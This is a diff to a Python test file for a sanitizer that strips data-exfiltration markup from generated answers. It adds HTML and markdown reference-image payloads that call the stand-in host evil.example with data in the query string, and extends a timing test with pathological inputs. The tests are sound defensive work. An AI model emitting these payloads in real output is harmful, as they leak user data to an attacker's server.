@@ -90,7 +90,31 @@ EVIL_FORMS = [
     '<input type=image src="https://evil.example/x?d=S">',
     '<meta http-equiv="refresh" content="0;url=https://evil.example/x?d=S">',
     '<svg><use href="https://evil.example/x.svg#a"></use></svg>',
+    '<a href="https://evil.example/x?d=S">unclosed label',
+    "<img" + " " * 5000 + "src=https://evil.example/x?d=S>",
+    '<p/style="background:url&#40;https://evil.example/x?d=S&#41;">t</p>',
+    '<p class="c"style="background:url&#40;https://evil.example/x?d=S&#41;">t</p>',
+    '<p title="a<b" style="background:url&#40;https://evil.example/x?d=S&#41;">t</p>',
+    '<script src="https://evil.example/x.js"></script>',
+    '<math><mglyph src="https://evil.example/x?d=S"></mglyph></math>',
+    "<a href=https://evil.example/x?d=S>unquoted</a>",
+    "<A HREF='https://evil.example/x?d=S'>mixed case</A>",
 ]
+
+REFERENCE_IMAGES = [
+    "![r][]\n\n> [r]: https://evil.example/x?d=S",
+    "![r]\n\n- [r]: https://evil.example/x?d=S",
+    "![r][r]\n\n    [r]: https://evil.example/x?d=S",
+    "![r]\n\n[r]:\n   https://evil.example/x?d=S",
+    "![r\nb][]\n\n[r\nb]: https://evil.example/x?d=S",
+]
+
+
+@pytest.mark.parametrize("form", REFERENCE_IMAGES)
+def test_a_reference_image_never_survives_wherever_its_definition_sits(form):
+    out = strip_exfil(form, "https://jobs.example/p/1")
+
+    assert "![" not in out
 
 
 @pytest.mark.parametrize("form", EVIL_FORMS)
@@ -110,10 +134,15 @@ def test_a_link_to_a_seen_address_keeps_its_label_and_target_through_nesting():
 def test_strip_exfil_stays_linear_on_adversarial_text():
     import time
 
-    for hostile in ["[" * 200_000, "![" * 100_000, "url(" * 50_000, "<a href=" * 30_000, "[]" * 100_000]:
+    hostile_inputs = [
+        "[" * 200_000, "![" * 100_000, "url(" * 50_000, "<a href=" * 30_000, "[]" * 100_000,
+        "<a " * 66_666, "[a](" * 50_000, "<style>" * 28_571, "<style></style>" * 13_000,
+        '<a title="' * 20_000,
+    ]
+    for hostile in hostile_inputs:
         started = time.perf_counter()
         strip_exfil(hostile, "")
-        assert time.perf_counter() - started < 3, hostile[:6]
+        assert time.perf_counter() - started < 5, hostile[:8]
 
 
 def test_an_answer_without_markup_is_unchanged():
